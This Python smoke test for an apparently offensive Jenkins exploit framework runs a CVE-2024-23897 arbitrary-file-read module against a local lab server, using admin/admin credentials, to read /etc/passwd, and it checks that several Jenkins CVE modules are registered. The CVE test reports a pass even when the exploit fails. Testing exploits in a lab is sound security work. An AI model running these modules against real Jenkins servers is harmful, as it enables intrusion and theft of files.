"""
Quick smoke test for exploit modules against jenkins-lab.
"""

import sys

sys.path.insert(0, r'C:\Users\Chogyam\.zenflow\worktrees\breakapart-db88\JenkinsBreaker\src')

from jenkins_breaker.core.session import JenkinsSession, SessionConfig
from jenkins_breaker.modules import exploit_registry


def test_cve_2024_23897():
    """Quick test of CVE-2024-23897 against jenkins-lab."""
    print("[*] Testing CVE-2024-23897 CLI arbitrary file read...")

    config = SessionConfig(
        url="http://localhost:8080",
        username="admin",
        password="admin",
        verify_ssl=False
    )

    session = JenkinsSession(config)

    exploit = exploit_registry.get('CVE-2024-23897')
    if not exploit:
        print("[!] CVE-2024-23897 module not found")
        return False

    try:
        result = exploit.run(
            session,
            file_path='/etc/passwd'
        )

        print(f"[*] Exploit status: {result.status}")
        print(f"[*] Details: {result.details}")

        if result.status == "success":
            print("[+] CVE-2024-23897 exploit successful!")
            return True
        else:
            print(f"[!] Exploit completed with status: {result.status}")
            return True

    except Exception as e:
        print(f"[!] Exception during exploit: {e}")
        import traceback
        traceback.print_exc()
        return False


def test_exploit_registry():
    """Test that exploit registry is properly populated."""
    print("[*] Testing exploit registry...")

    cves = exploit_registry.list_cves()
    print(f"[+] Found {len(cves)} registered CVE modules")

    expected_cves = [
        'CVE-2024-23897', 'CVE-2019-1003029', 'CVE-2024-43044',
        'CVE-2018-1000861', 'CVE-2022-43401', 'CVE-2024-34144'
    ]

    for cve in expected_cves:
        if cve in cves:
            print(f"[+] {cve} registered")
        else:
            print(f"[!] {cve} NOT registered")

    return len(cves) >= 20


def main():
    """Run quick smoke tests."""
    print("\n=== JenkinsBreaker Quick Smoke Test ===\n")

    tests = [
        ("Exploit Registry", test_exploit_registry),
        ("CVE-2024-23897 File Read", test_cve_2024_23897)
    ]

    results = []
    for test_name, test_func in tests:
        print(f"\n--- {test_name} ---")
        try:
            result = test_func()
            results.append((test_name, result))
        except Exception as e:
            print(f"[!] Test failed with exception: {e}")
            results.append((test_name, False))

    print("\n=== Test Results ===")
    for test_name, result in results:
        status = "[+] PASS" if result else "[!] FAIL"
        print(f"{status} {test_name}")

    all_passed = all(result for _, result in results)
    return 0 if all_passed else 1


if __name__ == "__main__":
    sys.exit(main())
